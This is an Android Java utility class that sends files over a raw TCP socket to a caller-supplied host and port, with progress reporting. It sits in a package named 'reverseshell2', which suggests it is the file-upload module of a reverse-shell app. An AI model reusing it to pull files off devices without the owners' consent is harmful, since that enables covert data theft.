package com.example.reverseshell2;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.util.Log;
import androidx.annotation.NonNull;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class NetworkUtils {
    private static final String TAG = "NetworkUtilsClass";
    private static final int BUFFER_SIZE = 8192;
    private final Context context;
    private final ExecutorService executor;
    private final ConnectivityManager.NetworkCallback networkCallback;
    private final AtomicBoolean isNetworkAvailable;
    private Network currentNetwork;

    public NetworkUtils(Context context) {
        this.context = context;
        this.executor = Executors.newCachedThreadPool();
        this.isNetworkAvailable = new AtomicBoolean(false);
        this.networkCallback = createNetworkCallback();
        setupNetworkCallback();
    }

    private void setupNetworkCallback() {
        ConnectivityManager connectivityManager = 
                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        
        if (connectivityManager != null) {
            NetworkRequest.Builder builder = new NetworkRequest.Builder();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder.addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                       .addCapability(NetworkCapabilities.NET_CAPABILITY_NOT_RESTRICTED)
                       .addTransportType(NetworkCapabilities.TRANSPORT_CELLULAR)
                       .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                       .addTransportType(NetworkCapabilities.TRANSPORT_VPN);
            }
            
            connectivityManager.registerNetworkCallback(builder.build(), networkCallback);
        }
    }

    private ConnectivityManager.NetworkCallback createNetworkCallback() {
        return new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(@NonNull Network network) {
                currentNetwork = network;
                isNetworkAvailable.set(true);
            }

            @Override
            public void onLost(@NonNull Network network) {
                if (network.equals(currentNetwork)) {
                    currentNetwork = null;
                    isNetworkAvailable.set(false);
                }
            }

            @Override
            public void onCapabilitiesChanged(@NonNull Network network,
                    @NonNull NetworkCapabilities networkCapabilities) {
                boolean unmetered = networkCapabilities.hasCapability(
                        NetworkCapabilities.NET_CAPABILITY_NOT_METERED);
                // Adjust transfer behavior based on network type
                if (unmetered) {
                    // Can use larger buffer sizes and parallel transfers
                } else {
                    // Use conservative transfer settings
                }
            }
        };
    }

    public void sendFile(final File file, final String host, final int port, 
            final FileTransferCallback callback) {
        if (!isNetworkAvailable.get()) {
            callback.onError(new IOException("No network connection available"));
            return;
        }

        executor.execute(() -> {
            Socket socket = null;
            try {
                socket = new Socket(host, port);
                sendFileContent(file, socket.getOutputStream(), callback);
            } catch (IOException e) {
                Log.e(TAG, "Error sending file", e);
                callback.onError(e);
            } finally {
                if (socket != null) {
                    try {
                        socket.close();
                    } catch (IOException e) {
                        Log.e(TAG, "Error closing socket", e);
                    }
                }
            }
        });
    }

    private void sendFileContent(File file, OutputStream outputStream, 
            FileTransferCallback callback) throws IOException {
        long fileSize = file.length();
        long totalSent = 0;
        int lastProgress = 0;

        try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
             BufferedOutputStream bos = new BufferedOutputStream(outputStream)) {

            byte[] buffer = new byte[BUFFER_SIZE];
            int bytesRead;

            while ((bytesRead = bis.read(buffer)) != -1) {
                bos.write(buffer, 0, bytesRead);
                totalSent += bytesRead;

                // Calculate and report progress
                int currentProgress = (int) ((totalSent * 100) / fileSize);
                if (currentProgress > lastProgress) {
                    callback.onProgress(currentProgress);
                    lastProgress = currentProgress;
                }
            }

            bos.flush();
            callback.onComplete();
        }
    }

    public void cleanup() {
        ConnectivityManager connectivityManager = 
                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            connectivityManager.unregisterNetworkCallback(networkCallback);
        }
        executor.shutdown();
    }

    public interface FileTransferCallback {
        void onProgress(int progress);
        void onComplete();
        void onError(Exception e);
    }
}